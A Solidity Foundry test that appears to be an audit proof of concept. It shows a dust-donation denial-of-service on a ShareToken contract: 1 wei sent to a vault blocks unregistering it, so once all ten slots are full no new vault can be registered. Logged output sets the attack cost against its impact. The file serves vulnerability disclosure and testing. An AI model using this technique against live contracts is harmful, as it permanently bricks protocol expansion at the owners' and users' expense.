    function test_DoS_PermanentProtocolLockout() public {
        console.log("--- Starting Attack: Permanent DoS in ShareToken Expansion ---");

        // 1. Fill all 10 slots (simulate mature protocol)
        vm.startPrank(owner);
        for(uint i = 0; i < 10; i++) {
            MockToken t = new MockToken(); 
            MockVault v = new MockVault(address(t), address(shareToken));
            shareToken.registerVault(address(t), address(v));
            assets.push(address(t));
            vaults.push(address(v));
        }
        vm.stopPrank();

        uint256 count = shareToken.getRegisteredAssets().length;
        assertEq(count, 10, "Protocol must have 10 vaults registered");
        console.log("   Slots filled: 10/10");

        // 2. Attack: Donate 1 wei (dust) to the first vault
        // This forces the balanceOf check to fail, preventing unregisterVault
        MockToken targetToken = MockToken(assets[0]);
        vm.prank(owner); 
        targetToken.transfer(attacker, 10); // Fund attacker with target token

        vm.startPrank(attacker);
        targetToken.transfer(vaults[0], 1); // DUST ATTACK: Send 1 wei to vault address
        vm.stopPrank();

        console.log("   Attacker donated 1 wei to Vault #0");

        // 3. Owner attempts to unregister (MUST FAIL)
        // The check `if (IERC20(asset).balanceOf(vaultAddress) != 0) revert CannotUnregisterVaultAssetBalance();`
        // will revert because vaultAddress now holds 1 wei of the asset.
        vm.startPrank(owner);

        console.log("   Owner attempts to unregister Vault #0...");
        vm.expectRevert(); // Expect revert due to dust donation
        shareToken.unregisterVault(assets[0]);
        console.log("   UnregisterVault reverted as expected (dust check)");

        vm.stopPrank();

        // 4. Owner attempts to register new vault (MUST FAIL - DoS)
        // Since unregister failed, all 10 slots are still occupied.
        // registerVault will revert with MaxVaultsExceeded.
        vm.startPrank(owner);
        MockToken newToken = new MockToken();
        MockVault newVault = new MockVault(address(newToken), address(shareToken));

        console.log("   Owner attempts to register NEW Vault #11...");
        vm.expectRevert(); // Expect revert due to MaxVaultsExceeded
        shareToken.registerVault(address(newToken), address(newVault));
        console.log("   RegisterVault failed: MaxVaultsExceeded. Protocol bricked.");

        vm.stopPrank();

        console.log("ECONOMIC IMPACT ANALYSIS:");
        console.log(" - Protocol Status:      PERMANENTLY BRICKED (Expansion blocked)");
        console.log(" - Attack Cost:          ~$0.0000001 (1 wei + gas)");
        console.log(" - Protocol Impact:      Total loss of future expansion capability");
        console.log(" - Recovery Method:      NONE (Requires contract upgrade)");
        console.log(" - ROI:                  Infinite (permanent DoS vs. minimal cost)");
    }
}

